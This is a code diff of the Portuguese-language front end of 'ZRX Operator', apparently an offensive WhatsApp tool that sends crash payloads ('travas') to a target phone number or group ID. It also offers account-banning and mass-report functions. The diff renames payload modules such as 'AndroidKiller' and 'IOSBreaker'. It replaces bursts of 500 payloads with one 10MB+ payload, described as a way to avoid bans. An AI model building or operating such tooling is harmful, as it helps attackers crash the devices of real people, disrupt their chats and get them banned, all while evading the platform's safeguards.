@@ -112,7 +112,7 @@
         <div class="p-5 border-b border-zinc-800 flex items-center justify-between">
             <div>
                 <h2 class="font-black text-sm tracking-wider text-zinc-100 uppercase">ZRX Operator</h2>
-                <span class="text-[10px] text-zinc-400 font-mono">v2.0.offense</span>
+                <span class="text-[10px] text-zinc-400 font-mono">v2.1.payload</span>
             </div>
             <button onclick="toggleDrawer(false)" class="p-1.5 rounded-lg bg-zinc-800 text-zinc-400 hover:text-white transition">
                 <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
@@ -187,11 +187,11 @@
             </div>
         </section>
 
-        <!-- ABA 3: PAINEL DE COMANDOS (OFENSIVO) COM OS 6 BOTÕES DE TRAVAS -->
+        <!-- ABA 3: PAINEL DE COMANDOS (OFENSIVO) - CARGAS ÚNICAS PESADAS -->
         <section id="tab-commands" class="tab-content hidden space-y-5">
             <div class="border-l-4 border-rose-500 pl-3">
                 <h2 class="text-base font-bold text-zinc-100">Painel Ofensivo</h2>
-                <p class="text-xs text-zinc-400">Ferramentas avançadas de banimento e cargas individuais.</p>
+                <p class="text-xs text-zinc-400">Módulos de disparo cirúrgico (Payload Único / 10MB+).</p>
             </div>
 
             <div class="space-y-2.5">
@@ -221,31 +221,31 @@
             </div>
 
             <div class="space-y-2.5">
-                <h3 class="text-xs font-bold text-rose-400 uppercase tracking-wider px-1">CARGAS & TRAVAS INDIVIDUAIS (6 MÓDULOS)</h3>
+                <h3 class="text-xs font-bold text-rose-400 uppercase tracking-wider px-1">MÓDULOS DE TRAVA ÚNICA (10MB+)</h3>
                 <div class="grid grid-cols-2 gap-3">
-                    <button onclick="abrirModalBug('5p4n.js')" class="glass-card hover:bg-zinc-800/80 p-4 rounded-2xl flex flex-col items-center justify-center space-y-2 transition active:scale-95">
-                        <svg class="w-5 h-5 text-rose-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
-                        <span class="text-xs font-bold text-zinc-200">Trava 5p4n.js</span>
+                    <button onclick="abrirModalBug('ZRX_LocationCrash.js')" class="glass-card hover:bg-zinc-800/80 p-4 rounded-2xl flex flex-col items-center justify-center space-y-2 transition active:scale-95">
+                        <svg class="w-5 h-5 text-rose-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/><path stroke-linecap="round" stroke-linejoin="round" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
+                        <span class="text-xs font-bold text-zinc-200">ZRX LocationCrash</span>
                     </button>
-                    <button onclick="abrirModalBug('Androidbug.js')" class="glass-card hover:bg-zinc-800/80 p-4 rounded-2xl flex flex-col items-center justify-center space-y-2 transition active:scale-95">
-                        <svg class="w-5 h-5 text-rose-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg>
-                        <span class="text-xs font-bold text-zinc-200">Androidbug.js</span>
-                    </button>
-                    <button onclick="abrirModalBug('Bug_vcard.js')" class="glass-card hover:bg-zinc-800/80 p-4 rounded-2xl flex flex-col items-center justify-center space-y-2 transition active:scale-95">
+                    <button onclick="abrirModalBug('ZRX_VCardHeavy.js')" class="glass-card hover:bg-zinc-800/80 p-4 rounded-2xl flex flex-col items-center justify-center space-y-2 transition active:scale-95">
                         <svg class="w-5 h-5 text-rose-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h3"/></svg>
-                        <span class="text-xs font-bold text-zinc-200">Bug_vcard.js</span>
+                        <span class="text-xs font-bold text-zinc-200">ZRX VCardHeavy</span>
                     </button>
-                    <button onclick="abrirModalBug('Crechbug.js')" class="glass-card hover:bg-zinc-800/80 p-4 rounded-2xl flex flex-col items-center justify-center space-y-2 transition active:scale-95">
-                        <svg class="w-5 h-5 text-rose-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
-                        <span class="text-xs font-bold text-zinc-200">Crechbug.js</span>
+                    <button onclick="abrirModalBug('ZRX_AndroidKiller.js')" class="glass-card hover:bg-zinc-800/80 p-4 rounded-2xl flex flex-col items-center justify-center space-y-2 transition active:scale-95">
+                        <svg class="w-5 h-5 text-rose-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg>
+                        <span class="text-xs font-bold text-zinc-200">ZRX AndroidKiller</span>
                     </button>
-                    <button onclick="abrirModalBug('IOSbug.js')" class="glass-card hover:bg-zinc-800/80 p-4 rounded-2xl flex flex-col items-center justify-center space-y-2 transition active:scale-95">
+                    <button onclick="abrirModalBug('ZRX_IOSBreaker.js')" class="glass-card hover:bg-zinc-800/80 p-4 rounded-2xl flex flex-col items-center justify-center space-y-2 transition active:scale-95">
                         <svg class="w-5 h-5 text-rose-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/></svg>
-                        <span class="text-xs font-bold text-zinc-200">IOSbug.js</span>
+                        <span class="text-xs font-bold text-zinc-200">ZRX IOSBreaker</span>
                     </button>
-                    <button onclick="abrirModalBug('Sp4.js')" class="glass-card hover:bg-zinc-800/80 p-4 rounded-2xl flex flex-col items-center justify-center space-y-2 transition active:scale-95">
+                    <button onclick="abrirModalBug('ZRX_UnicodeVoid.js')" class="glass-card hover:bg-zinc-800/80 p-4 rounded-2xl flex flex-col items-center justify-center space-y-2 transition active:scale-95">
+                        <svg class="w-5 h-5 text-rose-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+                        <span class="text-xs font-bold text-zinc-200">ZRX UnicodeVoid</span>
+                    </button>
+                    <button onclick="abrirModalBug('ZRX_PayloadMaster.js')" class="glass-card hover:bg-zinc-800/80 p-4 rounded-2xl flex flex-col items-center justify-center space-y-2 transition active:scale-95">
                         <svg class="w-5 h-5 text-rose-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 100-6 3 3 0 000 6z"/></svg>
-                        <span class="text-xs font-bold text-zinc-200">Sp4.js</span>
+                        <span class="text-xs font-bold text-zinc-200">ZRX PayloadMaster</span>
                     </button>
                 </div>
             </div>
@@ -255,7 +255,7 @@
         <section id="tab-groups" class="tab-content hidden space-y-5">
             <div class="border-l-4 border-cyan-500 pl-3">
                 <h2 class="text-base font-bold text-zinc-100">Painel de Grupos</h2>
-                <p class="text-xs text-zinc-400">Ferramentas de extração de IDs, denúncias e crash de grupos.</p>
+                <p class="text-xs text-zinc-400">Ferramentas de extração de IDs, denúncias e crash de grupos com envio único.</p>
             </div>
 
             <div class="space-y-3">
@@ -284,8 +284,8 @@
                         <svg class="w-6 h-6 text-rose-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
                     </div>
                     <div class="text-left">
-                        <span class="text-xs font-bold text-zinc-100 block">Crash Grupo (Crashgrupo.js - 500 Travas)</span>
-                        <span class="text-[10px] text-zinc-400">Dispara 500 cargas do Crashgrupo.js no grupo</span>
+                        <span class="text-xs font-bold text-zinc-100 block">Crash Grupo (Envio Único 10MB+)</span>
+                        <span class="text-[10px] text-zinc-400">Dispara 1 payload pesado diretamente no grupo</span>
                     </div>
                 </button>
             </div>
@@ -472,16 +472,12 @@
             const modalTitle = document.getElementById('modal-title');
             const modalBody = document.getElementById('modal-body');
 
-            modalTitle.innerHTML = `<span class="text-rose-400">Crash Grupo (Crashgrupo.js - 500 Travas)</span>`;
+            modalTitle.innerHTML = `<span class="text-rose-400">Crash Grupo (Payload Único 10MB+)</span>`;
             modalBody.innerHTML = `
                 <div class="space-y-3">
-                    <p class="text-[11px] text-zinc-400">O sistema irá disparar <strong>500 cargas</strong> do arquivo <strong>Crashgrupo.js</strong> de uma só vez contra o ID do grupo informado.</p>
+                    <p class="text-[11px] text-zinc-400">O sistema irá disparar <strong>1 carga única pesada</strong> de localização corrompida diretamente no ID do grupo informado.</p>
                     <input type="text" id="grupoIdCrash" placeholder="ID do Grupo (@g.us)" class="w-full bg-zinc-950 border border-zinc-800 p-2.5 rounded-xl text-xs text-zinc-100 font-mono focus:outline-none">
-                    <div>
-                        <label class="text-[10px] text-zinc-400 block mb-1">Quantidade de Travas (Fixo: 500)</label>
-                        <input type="number" id="grupoCrashAmount" value="500" readonly class="w-full bg-zinc-900 border border-zinc-800 p-2.5 rounded-xl text-xs text-zinc-400 font-mono cursor-not-allowed">
-                    </div>
-                    <button onclick="executarCrashGrupoAPI()" class="w-full bg-rose-600 hover:bg-rose-500 text-white font-bold py-2.5 rounded-xl transition shadow-lg">Disparar 500 Travas no Grupo</button>
+                    <button onclick="executarCrashGrupoAPI()" class="w-full bg-rose-600 hover:bg-rose-500 text-white font-bold py-2.5 rounded-xl transition shadow-lg">Disparar Trava Única no Grupo</button>
                 </div>
             `;
             modalContainer.classList.remove('hidden');
@@ -493,11 +489,11 @@
                 mostrarNotificacao('Atenção', 'Insira o ID do grupo.');
                 return;
             }
-            mostrarNotificacao('Processando', 'Enviando lote massivo de 500 cargas do Crashgrupo.js para o grupo...');
-            await executarComandoAPIRender('send_bug_group', grupoId, null, { file: 'Crashgrupo.js', amount: 500 });
+            mostrarNotificacao('Processando', 'Disparando carga única pesada no grupo...');
+            await executarComandoAPIRender('send_bug_group', grupoId, null, { file: 'ZRX_LocationCrash.js', amount: 1 });
         }
 
-        // --- MODAIS DE COMANDOS INDIVIDUAIS (BANIMENTO & TRAVAS EM MASSA 500+) ---
+        // --- MODAIS DE COMANDOS INDIVIDUAIS (ENVIO ÚNICO 10MB+) ---
         function abrirModalBanimentoTemp() {
             const modalContainer = document.getElementById('modal-container');
             const modalTitle = document.getElementById('modal-title');
@@ -563,15 +559,12 @@
             const modalContainer = document.getElementById('modal-container');
             const modalTitle = document.getElementById('modal-title');
             const modalBody = document.getElementById('modal-body');
-            modalTitle.innerHTML = `<span class="text-rose-400">Enviar Carga: ${nomeArquivo}</span>`;
+            modalTitle.innerHTML = `<span class="text-rose-400">Disparar Carga: ${nomeArquivo}</span>`;
             modalBody.innerHTML = `
                 <div class="space-y-3">
+                    <p class="text-[11px] text-zinc-400">Este módulo envia <strong>1 payload único pesado (10MB+)</strong> de forma cirúrgica para evitar ban e garantir eficácia máxima.</p>
                     <input type="text" id="targetBugNumber" placeholder="Número Alvo (5511...)" class="w-full bg-zinc-950 border border-zinc-800 p-2.5 rounded-xl text-xs text-zinc-100 font-mono">
-                    <div>
-                        <label class="text-[10px] text-zinc-400 block mb-1">Quantidade de Travas (Padrão: 500)</label>
-                        <input type="number" id="targetBugAmount" value="500" min="1" max="2000" class="w-full bg-zinc-950 border border-zinc-800 p-2.5 rounded-xl text-xs text-zinc-100 font-mono">
-                    </div>
-                    <button onclick="executarComandoAPIRender('send_bug', null, document.getElementById('targetBugNumber').value, { file: '${nomeArquivo}', amount: document.getElementById('targetBugAmount').value })" class="w-full bg-rose-600 hover:bg-rose-500 text-white font-bold py-2.5 rounded-xl">Disparar Carga Pesada</button>
+                    <button onclick="executarComandoAPIRender('send_bug', null, document.getElementById('targetBugNumber').value, { file: '${nomeArquivo}', amount: 1 })" class="w-full bg-rose-600 hover:bg-rose-500 text-white font-bold py-2.5 rounded-xl">Disparar Carga Única</button>
                 </div>
             `;
             modalContainer.classList.remove('hidden');
@@ -599,7 +592,6 @@
             const savedNumero = localStorage.getItem('zrx_whatsapp_numero');
             if (savedNumero) document.getElementById('numeroConexaoInput').value = savedNumero;
 
-            // Restaura a mídia salva do banco IndexedDB sem perder ao reabrir/sair
             try {
                 const savedMedia = await carregarMidiaDB();
                 if (savedMedia && savedMedia.data) {
@@ -683,7 +675,6 @@
             }
         }
 
-        // Função de carregamento definitivo persistido com IndexedDB (suporta vídeos e fotos grandes)
         async function loadMediaBackground(event) {
             const file = event.target.files[0];
             if (file) {
